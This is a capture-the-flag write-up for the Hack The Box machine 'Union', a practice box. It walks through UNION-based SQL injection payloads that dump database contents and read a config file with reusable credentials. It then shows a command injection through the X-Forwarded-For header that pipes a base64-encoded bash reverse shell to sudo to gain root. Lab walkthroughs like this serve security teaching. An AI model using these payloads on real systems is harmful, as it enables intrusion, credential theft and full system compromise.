---

title: 🟠 HTB - Union
author: Acivik
date: 2025-01-24 18:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Union, walkthrough, medium, linux]

---

![https://i.ibb.co/KsjYWLp/Union.png](https://i.ibb.co/KsjYWLp/Union.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

Nmap discovers that only port 80 (HTTP) is open as a result.

```bash
root@kali:~/HTB/union# nmap -p- -sT --min-rate 10000 10.10.11.128 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 18:28 UTC
Nmap scan report for 10.10.11.128 (10.10.11.128)
Host is up (0.063s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.48 seconds
root@kali:~/HTB/union#
root@kali:~/HTB/union# nmap -p80 --min-rate 10000 10.10.11.128 -sVC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 18:29 UTC
Nmap scan report for 10.10.11.128 (10.10.11.128)
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds
root@kali:~/HTB/union#
```

Web server is running Nginx on Ubuntu.

It’s hard to say anything specific about the operating system except that it's Ubuntu.

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">WebSite</span>

![https://i.ibb.co/0VwZwZq/resim-2025-01-23-113320715.png](https://i.ibb.co/0VwZwZq/resim-2025-01-23-113320715.png)

We will perform directory scanning to discover more pages.

### <span style="color:#FFC300">Directory Brute Force</span>

```bash
/index.php
/firewall.php
/config.php
/challenge.php
```

`/challenge.php` 

![https://i.ibb.co/sJyy8Rm/resim-2025-01-23-113716462.png](https://i.ibb.co/sJyy8Rm/resim-2025-01-23-113716462.png)

# <span style="color:#AA0E1C"><b># Foothold: Shell as uhc</b></span>

![https://i.ibb.co/ctxxgkV/Ekran-g-r-nt-s-2025-01-23-114305.png](https://i.ibb.co/ctxxgkV/Ekran-g-r-nt-s-2025-01-23-114305.png)

![https://i.ibb.co/dcXrhqF/Ekran-g-r-nt-s-2025-01-23-114405.png](https://i.ibb.co/dcXrhqF/Ekran-g-r-nt-s-2025-01-23-114405.png)

We successfully run an SQL injection to extract data from the database:

```bash
payload: ' union select group_concat(schema_name) from information_schema.schemata-- -
response: mysql,information_schema,performance_schema,sys,november
```

```bash
payload: ' union select group_concat(table_name) from information_schema.tables where table_schema='november'-- -
response: flag,players
```

```bash
payload: ' union select group_concat(column_name) from information_schema.columns where table_name='flag'-- -
response: one
```

```bash
payload: ' union select one from flag-- -
response: UHC{F1rst_5tep_2_Qualify}
```

We got the flag. Let's input this flag into `/challenge.php`.

![https://i.ibb.co/tLLKkRx/resim-2025-01-23-121353489.png](https://i.ibb.co/tLLKkRx/resim-2025-01-23-121353489.png)

The machine now allows us to access the SSH service, but we still don't have the credentials.

```bash
root@kali:~/HTB/union# nmap -p22 10.10.11.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 09:14 UTC
Nmap scan report for 10.10.11.128 (10.10.11.128)
Host is up (0.055s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
root@kali:~/HTB/union#
```

I am trying to read local files by exploiting the SQL injection vulnerability.

```bash
payload: ' union select load_file('/var/www/html/config.php')-- -
response: 
<?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

`uhc:uhc-11qual-global-pw`

```bash
root@kali:~/HTB/union# ssh uhc@10.10.11.128
uhc@10.10.11.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
uhc@union:~$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: uhc → root</b></span>

```bash
uhc@union:/var/www/html$ cat firewall.php 
<?php
require('config.php');

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

?>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
		<h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
		</div>
	</section>
</div>
uhc@union:/var/www/html$
```

We have accessed the application's source code, specifically the iptables command.. Using the HTTP header employed here, we can perform a command injection.

```bash
X-FORWARDED-FOR: ;echo "YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjEwLzEyMTIgPCYxCg=="|base64 -d|sudo /bin/bash;
```

we got root!

```bash
root@kali:~/HTB/union# nc -lnvp 1212
listening on [any] 1212 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.128] 42346
bash: cannot set terminal process group (808): Inappropriate ioctl for device
bash: no job control in this shell
root@union:/var/www/html#
```